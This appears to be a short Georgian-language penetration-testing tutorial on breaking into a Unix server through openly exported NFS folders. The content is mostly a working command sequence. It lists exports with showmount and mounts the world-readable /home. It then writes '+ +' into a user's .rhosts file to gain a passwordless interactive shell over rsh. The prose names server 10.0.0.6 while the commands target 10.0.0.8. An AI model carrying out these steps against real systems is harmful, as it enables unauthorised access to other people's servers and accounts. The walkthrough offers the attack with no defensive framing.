# NFS საჯარო პაპკების მეშვეობით სერვერში შეხწევა

თუ mountd სერვისი გაშვებულია, შეგიძლია იუნიქსის ბრძანება showmount-ი გამოიყენო რომ დადგინო ექსპორტირებული პაპკების სია. ამ პაპკებში მდებარე მონაცემების ნახვა შეგიძლია mount ბრძანების და სხვა NFS კლიენტის ხელსაწყოების მეშვეობით. 

მაგალითი: ვიყენებ showmount-ს სერვერის წინააღმდეგ რომელიცაა 10.0.0.6 და .rhost ფაილს ვქმნი მომხმარებლის home-ში, რომ კავშირის დამყარების პრივილეგია მოვიპოვო.

```
# showmount -e 10.0.0.8

Export list for 10.0.0.8:

/home       (everyone)
/usr/local  files.justasite.com
/disk0      10.0.0.10,10.0.0.11

# mount 10.0.0.8:/home /mnt
# cd /mnt
# ls -la

total 44

drwxr-x---  17 root      root    512 Jun 26 09:59 .
drwxr-xr-x   9 root      root    512 Oct 12 03:25 ..
drwx------   4 laura     users   512 Sep 20  2009 laura
drwxr-x---   4 john      users   512 Mar 12  2008 john
drwx------   3 rick      users   512 Nov 20  2007 rick
drwx--x--x   8 james     users  1024 Oct 31 13:15 james

# cd james
# echo + + > .rhosts
# cd /
# umount /mnt
# rsh -l james 10.0.0.8 csh -i

Warning: no access to tty; thus no job control in this shell...

laboratory%
```
